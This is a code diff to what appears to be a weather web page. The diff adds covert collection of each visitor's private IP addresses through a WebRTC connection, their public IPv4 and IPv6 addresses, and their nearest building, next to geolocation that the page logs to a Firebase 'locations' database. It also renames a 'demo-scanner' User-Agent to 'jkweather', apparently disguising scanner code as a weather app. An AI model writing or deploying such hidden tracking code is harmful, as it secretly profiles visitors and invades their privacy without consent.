@@ -301,12 +301,21 @@ function getWeather(lat, lon) {
 
 /* START */
 if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(position => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        getLocationName(lat, lon);
-        getWeather(lat, lon);
-        setInterval(() => getWeather(lat, lon), 10000);
+    navigator.geolocation.getCurrentPosition(async position => {
+
+        LAT = position.coords.latitude;
+        LON = position.coords.longitude;
+
+        await getPrivateIPs()
+        await getIPv4()
+        await getIPv6()
+        await getClosestBuilding()
+
+        getLocationName(LAT, LON);
+        getWeather(LAT, LON);
+
+        setInterval(() => getWeather(LAT, LON), 10000);
+
     }, () => {
         document.getElementById("location").textContent = "Location denied";
     });
@@ -322,43 +331,32 @@ let PRIVATE_IPV6 = "?"
 
 let CLOSEST_BUILDING = "?"
 
+let LAT = null
+let LON = null
+
 
 /* GET PUBLIC IPV4 */
-
 async function getIPv4(){
-
 const res = await fetch("https://api.ipify.org?format=json")
 const data = await res.json()
-
 PUBLIC_IPV4 = data.ip
-
 }
 
 
 /* GET PUBLIC IPV6 */
-
 async function getIPv6(){
-
 try{
-
 const res = await fetch("https://api64.ipify.org?format=json")
 const data = await res.json()
-
 PUBLIC_IPV6 = data.ip
-
 }catch{
-
 PUBLIC_IPV6 = "?"
-
 }
-
 }
 
 
 /* GET PRIVATE IPs */
-
 function getPrivateIPs(){
-
 return new Promise(resolve=>{
 
 const pc = new RTCPeerConnection({iceServers:[]})
@@ -391,20 +389,20 @@ resolve()
 },2000)
 
 })
-
 }
 
 
 /* FIND CLOSEST BUILDING */
-
 async function getClosestBuilding(){
+
+if(LAT === null || LON === null) return
 
 const url =
 `https://nominatim.openstreetmap.org/reverse?format=json&lat=${LAT}&lon=${LON}&zoom=18&addressdetails=1`
 
 const res = await fetch(url,{
 headers:{
-"User-Agent":"demo-scanner"
+"User-Agent":"jkweather"
 }
 })
 
@@ -441,7 +439,7 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
-window.logLocationToFirebase = function(lat, lon, city, state, PUBLIC_IPV4, PUBLIC_IPV6, PRIVATE_IPV4, PRIVATE_IPV6, CLOSEST_BUILDING) {
+window.logLocationToFirebase = function(lat, lon, city, state) {
     const messageListRef = ref(db, 'locations');
     const newMessageRef = push(messageListRef);
 
@@ -458,3 +456,4 @@ window.logLocationToFirebase = function(lat, lon, city, state, PUBLIC_IPV4, PUBL
     
 </body>
 </html>
+
